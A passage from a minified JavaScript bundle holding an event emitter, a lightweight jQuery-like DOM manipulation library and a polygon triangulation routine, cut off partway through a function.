/*! For license information please see scripts.js.LICENSE.txt */
(()=>{var t={718:t=>{"use strict";var e=Object.prototype.hasOwnProperty,i="~";function r(){}function n(t,e,i){this.fn=t,this.context=e,this.once=i||!1}function s(t,e,r,s,o){if("function"!=typeof r)throw new TypeError("The listener must be a function");var a=new n(r,s||t,o),h=i?i+e:e;return t._events[h]?t._events[h].fn?t._events[h]=[t._events[h],a]:t._events[h].push(a):(t._events[h]=a,t._eventsCount++),t}function o(t,e){0==--t._eventsCount?t._events=new r:delete t._events[e]}function a(){this._events=new r,this._eventsCount=0}Object.create&&(r.prototype=Object.create(null),(new r).__proto__||(i=!1)),a.prototype.eventNames=function(){var t,r,n=[];if(0===this._eventsCount)return n;for(r in t=this._events)e.call(t,r)&&n.push(i?r.slice(1):r);return Object.getOwnPropertySymbols?n.concat(Object.getOwnPropertySymbols(t)):n},a.prototype.listeners=function(t){var e=i?i+t:t,r=this._events[e];if(!r)return[];if(r.fn)return[r.fn];for(var n=0,s=r.length,o=new Array(s);n<s;n++)o[n]=r[n].fn;return o},a.prototype.listenerCount=function(t){var e=i?i+t:t,r=this._events[e];return r?r.fn?1:r.length:0},a.prototype.emit=function(t,e,r,n,s,o){var a=i?i+t:t;if(!this._events[a])return!1;var h,u,l=this._events[a],c=arguments.length;if(l.fn){switch(l.once&&this.removeListener(t,l.fn,void 0,!0),c){case 1:return l.fn.call(l.context),!0;case 2:return l.fn.call(l.context,e),!0;case 3:return l.fn.call(l.context,e,r),!0;case 4:return l.fn.call(l.context,e,r,n),!0;case 5:return l.fn.call(l.context,e,r,n,s),!0;case 6:return l.fn.call(l.context,e,r,n,s,o),!0}for(u=1,h=new Array(c-1);u<c;u++)h[u-1]=arguments[u];l.fn.apply(l.context,h)}else{var d,p=l.length;for(u=0;u<p;u++)switch(l[u].once&&this.removeListener(t,l[u].fn,void 0,!0),c){case 1:l[u].fn.call(l[u].context);break;case 2:l[u].fn.call(l[u].context,e);break;case 3:l[u].fn.call(l[u].context,e,r);break;case 4:l[u].fn.call(l[u].context,e,r,n);break;default:if(!h)for(d=1,h=new Array(c-1);d<c;d++)h[d-1]=arguments[d];l[u].fn.apply(l[u].context,h)}}return!0},a.prototype.on=function(t,e,i){return s(this,t,e,i,!1)},a.prototype.once=function(t,e,i){return s(this,t,e,i,!0)},a.prototype.removeListener=function(t,e,r,n){var s=i?i+t:t;if(!this._events[s])return this;if(!e)return o(this,s),this;var a=this._events[s];if(a.fn)a.fn!==e||n&&!a.once||r&&a.context!==r||o(this,s);else{for(var h=0,u=[],l=a.length;h<l;h++)(a[h].fn!==e||n&&!a[h].once||r&&a[h].context!==r)&&u.push(a[h]);u.length?this._events[s]=1===u.length?u[0]:u:o(this,s)}return this},a.prototype.removeAllListeners=function(t){var e;return t?(e=i?i+t:t,this._events[e]&&o(this,e)):(this._events=new r,this._eventsCount=0),this},a.prototype.off=a.prototype.removeListener,a.prototype.addListener=a.prototype.on,a.prefixed=i,a.EventEmitter=a,t.exports=a},553:t=>{!function(){"use strict";var e={class:"className",contenteditable:"contentEditable",for:"htmlFor",readonly:"readOnly",maxlength:"maxLength",tabindex:"tabIndex",colspan:"colSpan",rowspan:"rowSpan",usemap:"useMap"};function i(t,e){try{return t(e)}catch(t){return e}}var r=document,n=window,s=r.documentElement,o=r.createElement.bind(r),a=o("div"),h=o("table"),u=o("tbody"),l=o("tr"),c=Array.isArray,d=Array.prototype,p=d.concat,f=d.filter,g=d.indexOf,m=d.map,v=d.push,_=d.slice,y=d.some,x=d.splice,E=/^#(?:[\w-]|\\.|[^\x00-\xa0])*$/,b=/^\.(?:[\w-]|\\.|[^\x00-\xa0])*$/,T=/<.+>/,D=/^\w+$/;function w(t,e){var i,r=!!(i=e)&&11===i.nodeType;return t&&(r||M(e)||F(e))?!r&&b.test(t)?e.getElementsByClassName(t.slice(1)):!r&&D.test(t)?e.getElementsByTagName(t):e.querySelectorAll(t):[]}var S=function(){function t(t,e){if(t){if(O(t))return t;var i=t;if(U(t)){var s=(O(e)?e[0]:e)||r;if(!(i=E.test(t)&&"getElementById"in s?s.getElementById(t.slice(1)):T.test(t)?Rt(t):w(t,s)))return}else if(B(t))return this.ready(t);(i.nodeType||i===n)&&(i=[i]),this.length=i.length;for(var o=0,a=this.length;o<a;o++)this[o]=i[o]}}return t.prototype.init=function(e,i){return new t(e,i)},t}(),A=S.prototype,C=A.init;C.fn=C.prototype=A,A.length=0,A.splice=x,"function"==typeof Symbol&&(A[Symbol.iterator]=d[Symbol.iterator]),A.map=function(t){return C(p.apply([],m.call(this,(function(e,i){return t.call(e,i,e)}))))},A.slice=function(t,e){return C(_.call(this,t,e))};var I=/-([a-z])/g;function R(t){return t.replace(I,(function(t,e){return e.toUpperCase()}))}function P(t,e){var i=t&&(t.matches||t.webkitMatchesSelector||t.msMatchesSelector);return!!i&&!!e&&i.call(t,e)}function O(t){return t instanceof S}function N(t){return!!t&&t===t.window}function M(t){return!!t&&9===t.nodeType}function F(t){return!!t&&1===t.nodeType}function L(t){return"boolean"==typeof t}function B(t){return"function"==typeof t}function U(t){return"string"==typeof t}function k(t){return void 0===t}function G(t){return null===t}function H(t){return!isNaN(parseFloat(t))&&isFinite(t)}function z(t){if("object"!=typeof t||null===t)return!1;var e=Object.getPrototypeOf(t);return null===e||e===Object.prototype}function V(t,e,i){if(i){for(var r=t.length;r--;)if(!1===e.call(t[r],r,t[r]))return t}else if(z(t))for(var n=Object.keys(t),s=(r=0,n.length);r<s;r++){var o=n[r];if(!1===e.call(t[o],o,t[o]))return t}else for(r=0,s=t.length;r<s;r++)if(!1===e.call(t[r],r,t[r]))return t;return t}function X(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=!!L(t[0])&&t.shift(),r=t.shift(),n=t.length;if(!r)return{};if(!n)return X(i,C,r);for(var s=0;s<n;s++){var o=t[s];for(var a in o)i&&(c(o[a])||z(o[a]))?(r[a]&&r[a].constructor===o[a].constructor||(r[a]=new o[a].constructor),X(i,r[a],o[a])):r[a]=o[a]}return r}function j(t){return U(t)?function(e,i){return P(i,t)}:B(t)?t:O(t)?function(e,i){return t.is(i)}:t?function(e,i){return i===t}:function(){return!1}}function $(t,e){return e?t.filter(e):t}C.guid=1,C.isWindow=N,C.isFunction=B,C.isArray=c,C.isNumeric=H,C.isPlainObject=z,A.get=function(t){return k(t)?_.call(this):this[(t=Number(t))<0?t+this.length:t]},A.eq=function(t){return C(this.get(t))},A.first=function(){return this.eq(0)},A.last=function(){return this.eq(-1)},C.each=V,A.each=function(t){return V(this,t)},A.prop=function(t,i){if(t){if(U(t))return t=e[t]||t,arguments.length<2?this[0]&&this[0][t]:this.each((function(e,r){r[t]=i}));for(var r in t)this.prop(r,t[r]);return this}},A.removeProp=function(t){return this.each((function(i,r){delete r[e[t]||t]}))},C.extend=X,A.extend=function(t){return X(A,t)},A.filter=function(t){var e=j(t);return C(f.call(this,(function(t,i){return e.call(t,i,t)})))};var W=/\S+/g;function Y(t){return U(t)&&t.match(W)||[]}function q(t,e,i,r){for(var n=[],s=B(e),o=r&&j(r),a=0,h=t.length;a<h;a++)if(s){var u=e(t[a]);u.length&&v.apply(n,u)}else for(var l=t[a][e];!(null==l||r&&o(-1,l));)n.push(l),l=i?l[e]:null;return n}function Z(t){return t.length>1?f.call(t,(function(t,e,i){return g.call(i,t)===e})):t}function K(t,e,i){if(F(t)){var r=n.getComputedStyle(t,null);return i?r.getPropertyValue(e)||void 0:r[e]||t.style[e]}}function Q(t,e){return parseInt(K(t,e),10)||0}A.hasClass=function(t){return!!t&&y.call(this,(function(e){return F(e)&&e.classList.contains(t)}))},A.removeAttr=function(t){var e=Y(t);return this.each((function(t,i){F(i)&&V(e,(function(t,e){i.removeAttribute(e)}))}))},A.attr=function(t,e){if(t){if(U(t)){if(arguments.length<2){if(!this[0]||!F(this[0]))return;var i=this[0].getAttribute(t);return G(i)?void 0:i}return k(e)?this:G(e)?this.removeAttr(t):this.each((function(i,r){F(r)&&r.setAttribute(t,e)}))}for(var r in t)this.attr(r,t[r]);return this}},A.toggleClass=function(t,e){var i=Y(t),r=!k(e);return this.each((function(t,n){F(n)&&V(i,(function(t,i){r?e?n.classList.add(i):n.classList.remove(i):n.classList.toggle(i)}))}))},A.addClass=function(t){return this.toggleClass(t,!0)},A.removeClass=function(t){return arguments.length?this.toggleClass(t,!1):this.attr("class","")},C.unique=Z,A.add=function(t,e){return C(Z(this.get().concat(C(t,e).get())))};var J=/^--/;function tt(t){return J.test(t)}var et={},it=a.style,rt=["webkit","moz","ms"];function nt(t,e){if(void 0===e&&(e=tt(t)),e)return t;if(!et[t]){var i=R(t),r=""+i[0].toUpperCase()+i.slice(1);V((i+" "+rt.join(r+" ")+r).split(" "),(function(e,i){if(i in it)return et[t]=i,!1}))}return et[t]}var st={animationIterationCount:!0,columnCount:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,gridArea:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnStart:!0,gridRow:!0,gridRowEnd:!0,gridRowStart:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0};function ot(t,e,i){return void 0===i&&(i=tt(t)),i||st[t]||!H(e)?e:e+"px"}A.css=function(t,e){if(U(t)){var i=tt(t);return t=nt(t,i),arguments.length<2?this[0]&&K(this[0],t,i):t?(e=ot(t,e,i),this.each((function(r,n){F(n)&&(i?n.style.setProperty(t,e):n.style[t]=e)}))):this}for(var r in t)this.css(r,t[r]);return this};var at=/^\s+|\s+$/;function ht(t,e){var r=t.dataset[e]||t.dataset[R(e)];return at.test(r)?r:i(JSON.parse,r)}function ut(t,e,r){r=i(JSON.stringify,r),t.dataset[R(e)]=r}function lt(t,e){var i=t.documentElement;return Math.max(t.body["scroll"+e],i["scroll"+e],t.body["offset"+e],i["offset"+e],i["client"+e])}function ct(t,e){return Q(t,"border"+(e?"Left":"Top")+"Width")+Q(t,"padding"+(e?"Left":"Top"))+Q(t,"padding"+(e?"Right":"Bottom"))+Q(t,"border"+(e?"Right":"Bottom")+"Width")}A.data=function(t,e){if(!t){if(!this[0])return;var i={};for(var r in this[0].dataset)i[r]=ht(this[0],r);return i}if(U(t))return arguments.length<2?this[0]&&ht(this[0],t):k(e)?this:this.each((function(i,r){ut(r,t,e)}));for(var r in t)this.data(r,t[r]);return this},V([!0,!1],(function(t,e){V(["Width","Height"],(function(t,i){A[(e?"outer":"inner")+i]=function(r){if(this[0])return N(this[0])?e?this[0]["inner"+i]:this[0].document.documentElement["client"+i]:M(this[0])?lt(this[0],i):this[0][(e?"offset":"client")+i]+(r&&e?Q(this[0],"margin"+(t?"Top":"Left"))+Q(this[0],"margin"+(t?"Bottom":"Right")):0)}}))})),V(["Width","Height"],(function(t,e){var i=e.toLowerCase();A[i]=function(r){if(!this[0])return k(r)?void 0:this;if(!arguments.length)return N(this[0])?this[0].document.documentElement["client"+e]:M(this[0])?lt(this[0],e):this[0].getBoundingClientRect()[i]-ct(this[0],!t);var n=parseInt(r,10);return this.each((function(e,r){if(F(r)){var s=K(r,"boxSizing");r.style[i]=ot(i,n+("border-box"===s?ct(r,!t):0))}}))}}));var dt={};function pt(t){return"none"===K(t,"display")}function ft(t,e){return!e||!y.call(e,(function(e){return t.indexOf(e)<0}))}A.toggle=function(t){return this.each((function(e,i){F(i)&&((k(t)?pt(i):t)?(i.style.display=i.___cd||"",pt(i)&&(i.style.display=function(t){if(dt[t])return dt[t];var e=o(t);r.body.insertBefore(e,null);var i=K(e,"display");return r.body.removeChild(e),dt[t]="none"!==i?i:"block"}(i.tagName))):(i.___cd=K(i,"display"),i.style.display="none"))}))},A.hide=function(){return this.toggle(!1)},A.show=function(){return this.toggle(!0)};var gt={focus:"focusin",blur:"focusout"},mt={mouseenter:"mouseover",mouseleave:"mouseout"},vt=/^(mouse|pointer|contextmenu|drag|drop|click|dblclick)/i;function _t(t){return mt[t]||gt[t]||t}function yt(t){return t.___ce=t.___ce||{}}function xt(t){var e=t.split(".");return[e[0],e.slice(1).sort()]}function Et(t,e,i,r,n){var s=yt(t);if(e)s[e]&&(s[e]=s[e].filter((function(s){var o=s[0],a=s[1],h=s[2];if(n&&h.guid!==n.guid||!ft(o,i)||r&&r!==a)return!0;t.removeEventListener(e,h)})));else for(e in s)Et(t,e,i,r,n)}function bt(t){return t.multiple&&t.options?q(f.call(t.options,(function(t){return t.selected&&!t.disabled&&!t.parentNode.disabled})),"value"):t.value||""}A.off=function(t,e,i){var r=this;if(k(t))this.each((function(t,e){(F(e)||M(e)||N(e))&&Et(e)}));else if(U(t))B(e)&&(i=e,e=""),V(Y(t),(function(t,n){var s=xt(n),o=s[0],a=s[1],h=_t(o);r.each((function(t,r){(F(r)||M(r)||N(r))&&Et(r,h,a,e,i)}))}));else for(var n in t)this.off(n,t[n]);return this},A.on=function(t,e,i,r,n){var s=this;if(!U(t)){for(var o in t)this.on(o,e,i,t[o],n);return this}return U(e)||(k(e)||G(e)?e="":k(i)?(i=e,e=""):(r=i,i=e,e="")),B(r)||(r=i,i=void 0),r?(V(Y(t),(function(t,o){var a=xt(o),h=a[0],u=a[1],l=_t(h),c=h in mt,d=h in gt;l&&s.each((function(t,s){if(F(s)||M(s)||N(s)){var o=function t(o){if(o.target["___i"+o.type])return o.stopImmediatePropagation();if((!o.namespace||ft(u,o.namespace.split(".")))&&(e||!(d&&(o.target!==s||o.___ot===l)||c&&o.relatedTarget&&s.contains(o.relatedTarget)))){var a=s;if(e){for(var h=o.target;!P(h,e);){if(h===s)return;if(!(h=h.parentNode))return}a=h}Object.defineProperty(o,"currentTarget",{configurable:!0,get:function(){return a}}),Object.defineProperty(o,"delegateTarget",{configurable:!0,get:function(){return s}}),Object.defineProperty(o,"data",{configurable:!0,get:function(){return i}});var p=r.call(a,o,o.___td);n&&Et(s,l,u,e,t),!1===p&&(o.preventDefault(),o.stopPropagation())}};o.guid=r.guid=r.guid||C.guid++,function(t,e,i,r,n){var s=yt(t);s[e]=s[e]||[],s[e].push([i,r,n]),t.addEventListener(e,n)}(s,l,u,e,o)}}))})),this):this},A.one=function(t,e,i,r){return this.on(t,e,i,r,!0)},A.ready=function(t){var e=function(){return setTimeout(t,0,C)};return"loading"!==r.readyState?e():r.addEventListener("DOMContentLoaded",e),this},A.trigger=function(t,e){if(U(t)){var i=xt(t),n=i[0],s=i[1],o=_t(n);if(!o)return this;var a=vt.test(o)?"MouseEvents":"HTMLEvents";(t=r.createEvent(a)).initEvent(o,!0,!0),t.namespace=s.join("."),t.___ot=n}t.___td=e;var h=t.___ot in gt;return this.each((function(e,i){h&&B(i[t.___ot])&&(i["___i"+t.type]=!0,i[t.___ot](),i["___i"+t.type]=!1),i.dispatchEvent(t)}))};var Tt=/%20/g,Dt=/\r?\n/g,wt=/file|reset|submit|button|image/i,St=/radio|checkbox/i;A.serialize=function(){var t="";return this.each((function(e,i){V(i.elements||[i],(function(e,i){if(!(i.disabled||!i.name||"FIELDSET"===i.tagName||wt.test(i.type)||St.test(i.type)&&!i.checked)){var r=bt(i);k(r)||V(c(r)?r:[r],(function(e,r){t+=function(t,e){return"&"+encodeURIComponent(t)+"="+encodeURIComponent(e.replace(Dt,"\r\n")).replace(Tt,"+")}(i.name,r)}))}}))})),t.slice(1)},A.val=function(t){return arguments.length?this.each((function(e,i){var r=i.multiple&&i.options;if(r||St.test(i.type)){var n=c(t)?m.call(t,String):G(t)?[]:[String(t)];r?V(i.options,(function(t,e){e.selected=n.indexOf(e.value)>=0}),!0):i.checked=n.indexOf(i.value)>=0}else i.value=k(t)||G(t)?"":t})):this[0]&&bt(this[0])},A.clone=function(){return this.map((function(t,e){return e.cloneNode(!0)}))},A.detach=function(t){return $(this,t).each((function(t,e){e.parentNode&&e.parentNode.removeChild(e)})),this};var At=/^\s*<(\w+)[^>]*>/,Ct=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,It={"*":a,tr:u,td:l,th:l,thead:h,tbody:h,tfoot:h};function Rt(t){if(!U(t))return[];if(Ct.test(t))return[o(RegExp.$1)];var e=At.test(t)&&RegExp.$1,i=It[e]||It["*"];return i.innerHTML=t,C(i.childNodes).detach().get()}C.parseHTML=Rt,A.empty=function(){return this.each((function(t,e){for(;e.firstChild;)e.removeChild(e.firstChild)}))},A.html=function(t){return arguments.length?k(t)?this:this.each((function(e,i){F(i)&&(i.innerHTML=t)})):this[0]&&this[0].innerHTML},A.remove=function(t){return $(this,t).detach().off(),this},A.text=function(t){return k(t)?this[0]?this[0].textContent:"":this.each((function(e,i){F(i)&&(i.textContent=t)}))},A.unwrap=function(){return this.parent().each((function(t,e){if("BODY"!==e.tagName){var i=C(e);i.replaceWith(i.children())}})),this},A.offset=function(){var t=this[0];if(t){var e=t.getBoundingClientRect();return{top:e.top+n.pageYOffset,left:e.left+n.pageXOffset}}},A.offsetParent=function(){return this.map((function(t,e){for(var i=e.offsetParent;i&&"static"===K(i,"position");)i=i.offsetParent;return i||s}))},A.position=function(){var t=this[0];if(t){var e="fixed"===K(t,"position"),i=e?t.getBoundingClientRect():this.offset();if(!e){for(var r=t.ownerDocument,n=t.offsetParent||r.documentElement;(n===r.body||n===r.documentElement)&&"static"===K(n,"position");)n=n.parentNode;if(n!==t&&F(n)){var s=C(n).offset();i.top-=s.top+Q(n,"borderTopWidth"),i.left-=s.left+Q(n,"borderLeftWidth")}}return{top:i.top-Q(t,"marginTop"),left:i.left-Q(t,"marginLeft")}}},A.children=function(t){return $(C(Z(q(this,(function(t){return t.children})))),t)},A.contents=function(){return C(Z(q(this,(function(t){return"IFRAME"===t.tagName?[t.contentDocument]:"TEMPLATE"===t.tagName?t.content.childNodes:t.childNodes}))))},A.find=function(t){return C(Z(q(this,(function(e){return w(t,e)}))))};var Pt=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,Ot=/^$|^module$|\/(java|ecma)script/i,Nt=["type","src","nonce","noModule"];function Mt(t,e,i,r,n,a,h,u){return V(t,(function(t,a){V(C(a),(function(t,a){V(C(e),(function(e,h){var u=i?h:a,l=i?t:e;!function(t,e,i,r,n){r?t.insertBefore(e,i?t.firstChild:null):"HTML"===t.nodeName?t.parentNode.replaceChild(e,t):t.parentNode.insertBefore(e,i?t:t.nextSibling),n&&function(t,e){var i=C(t);i.filter("script").add(i.find("script")).each((function(t,i){if(Ot.test(i.type)&&s.contains(i)){var r=o("script");r.text=i.textContent.replace(Pt,""),V(Nt,(function(t,e){i[e]&&(r[e]=i[e])})),e.head.insertBefore(r,null),e.head.removeChild(r)}}))}(e,t.ownerDocument)}(i?a:h,l?u.cloneNode(!0):u,r,n,!l)}),u)}),h)}),a),e}A.after=function(){return Mt(arguments,this,!1,!1,!1,!0,!0)},A.append=function(){return Mt(arguments,this,!1,!1,!0)},A.appendTo=function(t){return Mt(arguments,this,!0,!1,!0)},A.before=function(){return Mt(arguments,this,!1,!0)},A.insertAfter=function(t){return Mt(arguments,this,!0,!1,!1,!1,!1,!0)},A.insertBefore=function(t){return Mt(arguments,this,!0,!0)},A.prepend=function(){return Mt(arguments,this,!1,!0,!0,!0,!0)},A.prependTo=function(t){return Mt(arguments,this,!0,!0,!0,!1,!1,!0)},A.replaceWith=function(t){return this.before(t).remove()},A.replaceAll=function(t){return C(t).replaceWith(this),this},A.wrapAll=function(t){for(var e=C(t),i=e[0];i.children.length;)i=i.firstElementChild;return this.first().before(e),this.appendTo(i)},A.wrap=function(t){return this.each((function(e,i){var r=C(t)[0];C(i).wrapAll(e?r.cloneNode(!0):r)}))},A.wrapInner=function(t){return this.each((function(e,i){var r=C(i),n=r.contents();n.length?n.wrapAll(t):r.append(t)}))},A.has=function(t){var e=U(t)?function(e,i){return w(t,i).length}:function(e,i){return i.contains(t)};return this.filter(e)},A.is=function(t){var e=j(t);return y.call(this,(function(t,i){return e.call(t,i,t)}))},A.next=function(t,e,i){return $(C(Z(q(this,"nextElementSibling",e,i))),t)},A.nextAll=function(t){return this.next(t,!0)},A.nextUntil=function(t,e){return this.next(e,!0,t)},A.not=function(t){var e=j(t);return this.filter((function(i,r){return(!U(t)||F(r))&&!e.call(r,i,r)}))},A.parent=function(t){return $(C(Z(q(this,"parentNode"))),t)},A.index=function(t){var e=t?C(t)[0]:this[0],i=t?this:C(e).parent().children();return g.call(i,e)},A.closest=function(t){var e=this.filter(t);if(e.length)return e;var i=this.parent();return i.length?i.closest(t):e},A.parents=function(t,e){return $(C(Z(q(this,"parentElement",!0,e))),t)},A.parentsUntil=function(t,e){return this.parents(e,t)},A.prev=function(t,e,i){return $(C(Z(q(this,"previousElementSibling",e,i))),t)},A.prevAll=function(t){return this.prev(t,!0)},A.prevUntil=function(t,e){return this.prev(e,!0,t)},A.siblings=function(t){return $(C(Z(q(this,(function(t){return C(t).parent().children().not(t)})))),t)},t.exports=C}()},187:t=>{"use strict";function e(t,e,r){r=r||2;var s,o,a,h,c,d,f,g=e&&e.length,m=g?e[0]*r:t.length,v=i(t,0,m,r,!0),_=[];if(!v||v.next===v.prev)return _;if(g&&(v=function(t,e,r,n){var s,o,a,h=[];for(s=0,o=e.length;s<o;s++)(a=i(t,e[s]*n,s<o-1?e[s+1]*n:t.length,n,!1))===a.next&&(a.steiner=!0),h.push(p(a));for(h.sort(u),s=0;s<h.length;s++)r=l(h[s],r);return r}(t,e,v,r)),t.length>80*r){s=a=t[0],o=h=t[1];for(var y=r;y<m;y+=r)(c=t[y])<s&&(s=c),(d=t[y+1])<o&&(o=d),c>a&&(a=c),d>h&&(h=d);f=0!==(f=Math.max(a-s,h-o))?32767/f:0}return n(v,_,r,s,o,f,0),_}function i(t,e,i,r,n){var s,o;if(n===S(t,e,i,r)>0)for(s=e;s<i;s+=r)o=T(s,t[s],t[s+1],o);else for(s=i-r;s>=e;s-=r)o=T(s,t[s],t[s+1],o);return o&&v(o,o.next)&&(D(o),o=o.next),o}function r(t,e){if(!t)return t;e||(e=t);var i,r=t;do{if(i=!1,r.steiner||!v(r,r.next)&&0!==m(r.prev,r,r.next))r=r.next;else{if(D(r),(r=e=r.prev)===r.next)break;i=!0}}while(i||r!==e);return e}function n(t,e,i,u,l,c,p){if(t){!p&&c&&function(t,e,i,r){var n=t;do{0===n.z&&(n.z=d(n.x,n.y,e,i,r)),n.prevZ=n.prev,n.nextZ=n.next,n=n.next}while(n!==t);n.prevZ.nextZ=null,n.prevZ=null,function(t){var e,i,r,n,s,o,a,h,u=1;do{for(i=t,t=null,s=null,o=0;i;){for(o++,r=i,a=0,e=0;e<u&&(a++,r=r.nextZ);e++);for(h=u;a>0||h>0&&r;)0!==a&&(0===h||!r||i.z<=r.z)?(n=i,i=i.nextZ,a--):(n=r,r=r.nextZ,h--),s?s.nextZ=n:t=n,n.prevZ=s,s=n;i=r}s.nextZ=null,u*=2}while(o>1)}(n)}(t,u,l,c);for(var f,g,m=t;t.prev!==t.next;)if(f=t.prev,g=t.next,c?o(t,u,l,c):s(t))e.push(f.i/i|0),e.push(t.i/i|0),e.push(g.i/i|0),D(t),t=g.next,m=g.next;else if((t=g)===m){p?1===p?n(t=a(r(t),e,i),e,i,u,l,c,2):2===p&&h(t,e,i,u,l,c):n(r(t),e,i,u,l,c,1);break}}}function s(t){var e=t.prev,i=t,r=t.next;if(m(e,i,r)>=0)return!1;for(var n=e.x,s=i.x,o=r.x,a=e.y,h=i.y,u=r.y,l=n<s?n<o?n:o:s<o?s:o,c=a<h?a<u?a:u:h<u?h:u,d=n>s?n>o?n:o:s>o?s:o,p=a>h?a>u?a:u:h>u?h:u,g=r.next;g!==e;){if(g.x>=l&&g.x<=d&&g.y>=c&&g.y<=p&&f(n,a,s,h,o,u,g.x,g.y)&&m(g.prev,g,g.next)>=0)return!1;g=g.next}return!0}function o(t,e,i,r){var n=t.prev,s=t,o=t.next;if(m(n,s,o)>=0)return!1;for(var a=n.x,h=s.x,u=o.x,l=n.y,c=s.y,p=o.y,g=a<h?a<u?a:u:h<u?h:u,v=l<c?l<p?l:p:c<p?c:p,_=a>h?a>u?a:u:h>u?h:u,y=l>c?l>p?l:p:c>p?c:p,x=d(g,v,e,i,r),E=d(_,y,e,i,r),b=t.prevZ,T=t.nextZ;b&&b.z>=x&&T&&T.z<=E;){if(b.x>=g&&b.x<=_&&b.y>=v&&b.y<=y&&b!==n&&b!==o&&f(a,l,h,c,u,p,b.x,b.y)&&m(b.prev,b,b.next)>=0)return!1;if(b=b.prevZ,T.x>=g&&T.x<=_&&T.y>=v&&T.y<=y&&T!==n&&T!==o&&f(a,l,h,c,u,p,T.x,T.y)&&m(T.prev,T,T.next)>=0)return!1;T=T.nextZ}for(;b&&b.z>=x;){if(b.x>=g&&b.x<=_&&b.y>=v&&b.y<=y&&b!==n&&b!==o&&f(a,l,h,c,u,p,b.x,b.y)&&m(b.prev,b,b.next)>=0)return!1;b=b.prevZ}for(;T&&T.z<=E;){if(T.x>=g&&T.x<=_&&T.y>=v&&T.y<=y&&T!==n&&T!==o&&f(a,l,h,c,u,p,T.x,T.y)&&m(T.prev,T,T.next)>=0)return!1;T=T.nextZ}return!0}function a(t,e,i){var n=t;do{var s=n.prev,o=n.next.next;!v(s,o)&&_(s,n,n.next,o)&&E(s,o)&&E(o,s)&&(e.push(s.i/i|0),e.push(n.i/i|0),e.push(o.i/i|0),D(n),D(n.next),n=t=o),n=n.next}while(n!==t);return r(n)}function h(t,e,i,s,o,a){var h=t;do{for(var u=h.next.next;u!==h.prev;){if(h.i!==u.i&&g(h,u)){var l=b(h,u);return h=r(h,h.next),l=r(l,l.next),n(h,e,i,s,o,a,0),void n(l,e,i,s,o,a,0)}u=u.next}h=h.next}while(h!==t)}function u(t,e){return t.x-e.x}function l(t,e){var i=function(t,e){var i,r=e,n=t.x,s=t.y,o=-1/0;do{if(s<=r.y&&s>=r.next.y&&r.next.y!==r.y){var a=r.x+(s-r.y)*(r.next.x-r.x)/(r.next.y-r.y);if(a<=n&&a>o&&(o=a,i=r.x<r.next.x?r:r.next,a===n))return i}r=r.next}while(r!==e);if(!i)return null;var h,u=i,l=i.x,d=i.y,p=1/0;r=i;do{n>=r.x&&r.x>=l&&n!==r.x&&f(s<d?n:o,s,l,d,s<d?o:n,s,r.x,r.y)&&(h=Math.abs(s-r.y)/(n-r.x),E(r,t)&&(h<p||h===p&&(r.x>i.x||r.x===i.x&&c(i,r)))&&(i=r,p=h)),r=r.next}while(r!==u);return i}(t,e);if(!i)return e;var n=b(i,t);return r(n,n.next),r(i,i.next)}function c(t,e){return m(t.prev,t,e.prev)<0&&m(e.next,t,t.next)<0}function d(t,e,i,r,n){return(t=1431655765&((t=858993459&((t=252645135&((t=16711935&((t=(t-i)*n|0)|t<<8))|t<<4))|t<<2))|t<<1))|(e=1431655765&((e=858993459&((e=252645135&((e=16711935&((e=(e-r)*n|0)|e<<8))|e<<4))|e<<2))|e<<1))<<1}function p(t){var e=t,i=t;do{(e.x<i.x||e.x===i.x&&e.y<i.y)&&(i=e),e=e.next}while(e!==t);return i}function f(t,e,i,r,n,s,o,a){return(n-o)*(e-a)>=(t-o)*(s-a)&&(t-o)*(r-a)>=(i-o)*(e-a)&&(i-o)*(s-a)>=(n-o)*(r-a)}function g(t,e){return t.next.i!==e.i&&t.prev.i!==e.i&&!function(t,e){var i=t;do{if(i.i!==t.i&&i.next.i!==t.i&&i.i!==e.i&&i.next.i!==e.i&&_(i,i.next,t,e))return!0;i=i.next}while(i!==t);return!1}(t,e)&&(E(t,e)&&E(e,t)&&function(t,e){var i=t,r=!1,n=(t.x+e.x)/2,s=(t.y+e.y)/2;do{i.y>s!=i.next.y>s&&i.next.y!==i.y&&n<(i.next.x-i.x)*(s-i.y)/(i.next.y-i.y)+i.x&&(r=!r),i=i.next}while(i!==t);return r}(t,e)&&(m(t.prev,t,e.prev)||m(t,e.prev,e))||v(t,e)&&m(t.prev,t,t.next)>0&&m(e.prev,e,e.next)>0)}function m(t,e,i){return(e.y-t.y)*(i.x-e.x)-(e.x-t.x)*(i.y-e.y)}function v(t,e){return t.x===e.x&&t.y===e.y}function _(t,e,i,r){var n=x(m(t,e,i)),s=x(m(t,e,r)),o=x(m(i,r,t)),a=x(m(i,r,e));return n!==s&&o!==a||!(0!==n||!y(t,i,e))||!(0!==s||!y(t,r,e))||!(0!==o||!y(i,t,r))||!(0!==a||!y(i,e,r))}function y(t,e,i){return e.x<=Math.max(t.x,i.x)&&e.x>=Math.min(t.x,i.x)&&e.y<=Math.max(t.y,i.y)&&e.y>=Math.min(t.y,i.y)}function x(t){return t>0?1:t<0?-1:0}function E(t,e){return m(t.prev,t,t.next)<0?m(t,e,t.next)>=0&&m(t,t.prev,e)>=0:m(t,e,t.prev)<0||m(t,t.next,e)<0}function b(t,e){var i=new w(t.i,t.x,t.y),r=new w(e.i,e.x,e.y),n=t.next,s=e.prev;return t.next=e,e.prev=t,i.next=n,n.prev=i,r.next=i,i.prev=r,s.next=r,r.prev=s,r}function T(t,e,i,r){var n=new w(t,e,i);return r?(n.next=r.next,n.prev=r,r.next.prev=n,r.next=n):(n.prev=n,n.next=n),n}function D(t){t.next.prev=t.prev,t.prev.next=t.next,t.prevZ&&(t.prevZ.nextZ=t.nextZ),t.nextZ&&(t.nextZ.prevZ=t.prevZ)}function w(t,e,i){this.i=t,this.x=e,this.y=i,this.prev=null,this.next=null,this.z=0,this.prevZ=null,this.nextZ=null,this.steiner=!1}function S(t,e,i,r){for(var n=0,s=e,o=i-r;s<i;s+=r)n+=(t[o]-t[s])*(t[s+1]+t[o+1]),o=s;return n}t.exports=e,t.exports.default=e,e.deviation=function(t,e,i,r){var n=e&&e.length,s=n?e[0]*i:t.length,o=Math.abs(S(t,0,s,i));if(n)for(var a=0,h=e.length;a<h;a++){var 